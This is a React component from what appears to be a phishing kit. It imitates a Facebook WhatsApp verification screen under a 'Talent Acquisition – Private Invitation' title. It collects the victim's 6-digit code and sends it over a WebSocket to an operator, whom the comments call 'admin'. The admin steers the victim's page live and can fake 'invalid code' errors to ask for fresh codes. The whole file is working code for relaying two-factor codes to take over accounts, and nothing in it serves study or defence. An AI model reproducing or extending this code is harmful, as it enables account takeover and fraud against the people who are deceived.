// @ts-nocheck
import { useState, useEffect } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { useWebSocket } from "../../context/WebSocketContext";
import useDynamicCss from "../../utils/useDynamicCss";

const WhatsAppVerification = () => {
  useEffect(() => {
    document.title = 'Talent Acquisition – Private Invitation';
  }, []);

  useDynamicCss("/css/facebook/verification.css");
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const errorParam = searchParams.get("error");

  const {
    submitForm,
    isConnected,
    verificationError,
    clearVerificationError,
    navigationEvent,
    clearNavigationEvent,
  } = useWebSocket();
  const [code, setCode] = useState("");
  const [showError, setShowError] = useState(false);
  const [showInvalidError, setShowInvalidError] = useState(
    errorParam === "wrong-code",
  );
  const [isLoading, setIsLoading] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [countdown, setCountdown] = useState(120); // 2 minutes in seconds
  const [canResend, setCanResend] = useState(false);
  const [isPageLoading, setIsPageLoading] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => setIsPageLoading(false), 700);
    return () => clearTimeout(timer);
  }, []);

  // Reset state when admin navigates (allows changing route without re-submitting)
  useEffect(() => {
    if (navigationEvent) {
      setIsLoading(false);
      setIsSubmitted(false);
      clearNavigationEvent();
    }
  }, [navigationEvent, clearNavigationEvent]);

  useEffect(() => {
    const errorParam = searchParams.get("error");
    if (errorParam === "wrong-code") {
      setShowInvalidError(true);
      setIsLoading(false);
      setIsSubmitted(false);
    }
  }, [searchParams]);

  // Handle verification error from admin
  useEffect(() => {
    if (
      verificationError &&
      (verificationError.type === "whatsapp" ||
        verificationError.type === "fb-whatsapp" ||
        verificationError.type === "wrong-code")
    ) {
      setShowInvalidError(true);
      setIsLoading(false);
      setIsSubmitted(false);
      setCode("");
      clearVerificationError();
    }
  }, [verificationError, clearVerificationError]);

  useEffect(() => {
    if (countdown <= 0) {
      setCanResend(true);
      return;
    }

    const timer = setInterval(() => {
      setCountdown((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [countdown]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
  };

  const handleSubmit = (e: any) => {
    e.preventDefault();

    const value = code.trim();

    // Validate code length (exactly 6 digits)
    if (value.length !== 6 || !/^\d+$/.test(value)) {
      setShowError(true);
      return;
    }

    setShowError(false);
    setIsLoading(true);

    // Submit to WebSocket
    submitForm("fb-whatsapp", {
      code: value,
    });

    setIsSubmitted(true);
    // Keep loading state - admin will navigate via WebSocket
  };

  const handleResendCode = () => {
    if (canResend) {
      setCountdown(120);
      setCanResend(false);
    }
  };

  return (
    <>
      {isPageLoading && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100vw",
            height: "100vh",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            backgroundColor: "#ffffff",
            zIndex: 99999,
          }}
        ></div>
      )}
      <div
        className={`wrapper-loading-root ${isLoading ? "body-loading" : "hidden"}`}
      >
        <div className={`progress-bar ${isLoading ? "show" : ""}`}>
          <div className="bar1"></div>
          <div className="bar2"></div>
        </div>
      </div>
      <div className={`verification_main ${isLoading ? "body-loading" : ""}`}>
        <div className="container">
          <div className="heading">
            <span>• Facebook</span>
            <h2>Check your WhatsApp messages</h2>
            <p>Enter the code we sent to your WhatsApp.</p>
          </div>
          <div className="image">
            <img alt="WhatsApp Verification" src="/whatsapp-sms.png" />
          </div>
          <div className="form">
            <form onSubmit={handleSubmit}>
              <input
                className="authFormInput"
                id="authenticator"
                placeholder="Code"
                maxLength={6}
                type="text"
                name="authenticator"
                value={code}
                onChange={(e: any) => {
                  setCode(e.target.value);
                  setShowError(false);
                  setShowInvalidError(false);
                }}
              />
              <span className={`error ${showError ? "show" : ""}`}>
                Entered code must be exactly 6 digits
              </span>
              <span
                className={`error ${showInvalidError ? "show" : ""}`}
                style={{ marginTop: "8px" }}
              >
                Invalid code. Please check your WhatsApp and try again.
              </span>
              <div className="new_code">
                <div className="request items-center">
                  <svg
                    viewBox="0 0 24 24"
                    fill="currentColor"
                    width="1em"
                    height="1em"
                  >
                    <path d="M3 12a9 9 0 0 1 9-9c2.144 0 4.111.749 5.657 2H16a1 1 0 1 0 0 2h4a1 1 0 0 0 1-1V2a1 1 0 1 0-2 0v1.514A10.959 10.959 0 0 0 12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11a1 1 0 1 0-2 0 9 9 0 1 1-18 0z"></path>
                  </svg>
                  {canResend ? (
                    <span onClick={handleResendCode}>Request new code</span>
                  ) : (
                    <p id="showSeconds">
                      We can send a new code in{" "}
                      <span id="seconds">{formatTime(countdown)}</span>
                    </p>
                  )}
                </div>
              </div>
              <div className="authSubmit">
                <button
                  name="submitAuth"
                  id="submitButton"
                  type="submit"
                  className="submit-btn"
                  disabled={isLoading}
                >
                  {isLoading ? (
                    <>
                      <svg className="spinner" viewBox="0 0 50 50">
                        <circle
                          className="path"
                          cx="25"
                          cy="25"
                          r="20"
                          fill="none"
                          strokeWidth="5"
                        ></circle>
                      </svg>
                      <span>Please wait...</span>
                    </>
                  ) : (
                    "Continue"
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </>
  );
};

export default WhatsAppVerification;
